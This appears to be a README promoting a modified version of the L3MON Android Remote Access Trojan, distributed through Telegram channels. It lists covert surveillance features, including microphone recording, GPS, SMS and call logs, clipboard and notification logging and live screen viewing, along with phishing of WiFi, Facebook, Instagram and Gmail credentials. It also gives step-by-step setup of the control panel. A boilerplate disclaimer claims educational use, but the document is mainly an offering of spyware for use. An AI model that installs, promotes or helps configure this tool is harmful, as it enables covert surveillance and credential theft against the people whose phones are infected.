# [L3MON](https://github.com/p09eye/) 
</p>
<p> We as <a href="https://t.me/deVL33014">DeVL3</a> are pleased to unveil L3MON, an improved iteration of our tool. Kindly peruse the following sections to acquaint yourself with the tool's functionalities and capabilities. L3MON RAT, as modified by l3mon2024, stands as one of the most potent Remote Access Trojans (RATs) equipped with a sophisticated web-based control panel. </p>

# <a href="https://t.me/PrivateHackingClassesAndTools">L3MON UPDATE</a>:
- Real-time SCREEN Viewer
- SCREENSHOT Capture
- File upload and download Capabilities
- WiFI password Phishing
- Facebook, Instagram, and Gmail credentials Phishing
- BACKGROUND SERVICE available 24/7
- No requirement for PORT FORWARDING (FREE VPS LOGIN PANEL)
- screen unlock (soon)

# <a href="https://t.me/deVL33014">L3MON FREE UPDATE</a>:
- GPS Logging
- Microphone Recording
- Viewing Contacts
- SMS Logs
- Sending SMS
- Call Logs
- Viewing Installed Apps
- Inspecting Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- Viewing WiFi Networks (including logs of previously accessed networks)
- File Explorer & Downloader
- Command Queuing
- Built-In APK Builder
- Autorun (contact to setup for free)


# L3MON- basic Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## Installation 
1. Install JRE 8


2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you encounter difficulties comprehending these instructions, it is advisable to reconsider your suitability for utilizing this tool.)

3. install PM2 
    - `npm install pm2 -g`
    - `npm install`
    - `npm audit fix`
    - `npm audit`

4. Download and Extract the latest release from [HERE](https://t.me/deVL33014)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run L3MON on startup

6. Set a Username & Password
    1. Stop L3MON `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. MD5 Hash `echo -n deVL33014 | openssl md5|awk '{print $2}'`
    4. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run 
        - pm2 restart all`

7. in your browser navigate to 
        - `http://127.0.0.1:22533`

## Notes
When opening an issue, you **MUST** use the provided templates. Issues without this will not receive support quickly and will be put to the bottom of the figurative pile.

Please have a look through the current issues, open and closed to see if your issue has been addressed before. If it's java related, it's most definitely been addressed - In short Use Java 1.8.0

## Disclaimer
- The L3MON is a software application designed for legitimate and ethical purposes of security and research. It is essential to understand and agree to the following terms and conditions before using this tool:

- Legal and Ethical Use: Users are strictly prohibited from using L3MON for any illegal, unethical, or harmful activities. This includes, but is not limited to, unauthorized access to mobile systems, data theft, harassment, or any activity that violates local, national, or international laws.

- Ownership and Responsibility: The developers and providers of L3MON disclaim any responsibility for the misuse of this tool. Users are solely responsible for their actions and should use L3MON only in compliance with applicable laws and ethical standards.

- Consent and Privacy: It is the user's responsibility to obtain explicit consent from individuals whose devices or data may be accessed or monitored using L3MON. Invasion of privacy or unauthorized access to personal information is strictly prohibited.

- No Warranty: L3MON is provided "as is," without any warranties, express or implied. The developers make no guarantees regarding its performance, reliability, or suitability for any particular purpose.

- Educational and Research Purposes: L3MON may be used for educational and research purposes by professionals, cybersecurity experts, and ethical hackers. However, even in these cases, it should be used responsibly and in accordance with applicable laws and regulations.

- Documentation and Reporting: Users are encouraged to maintain clear and accurate documentation of their activities when using L3MON. Any vulnerabilities or issues discovered should be reported to the appropriate parties promptly.

- User Discretion: Users are advised to exercise discretion and caution when using L3MON to avoid any unintended consequences, legal troubles, or damage to individuals, organizations, or systems.

- By using L3MON, you acknowledge that you have read and understood these terms and conditions and agree to abide by them. Any misuse or violation of these terms may result in legal consequences.

- L3MON is a powerful tool that should be used responsibly and ethically. Failure to do so may result in legal action and damage to your reputation.

## Thanks
L3MON Builds off and utilizes several opensource software, Without these, L3MON Wouldn't be what it is!
 - Inspiration for the project and the basic building blocks for the Android App are based on [AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT) 
 - [express](https://github.com/expressjs/express)
 - [node-geoip](https://github.com/bluesmoon/node-geoip)
 - [lowdb](https://github.com/typicode/lowdb)
 - [socket.io](https://github.com/socketio/socket.io)
 - [Open Street Map](https://www.openstreetmap.org)
 - [Leaflet](https://leafletjs.com/)

## More
<b>D3VL Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
L3MON is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ❤️ By <a href="//d3vl.com">D3VL</a></p>
<p align="center" style="font-size: 8px">v1.1.2 <a href="https://github.com/D3VL/L3MON">Credit!</a></p>
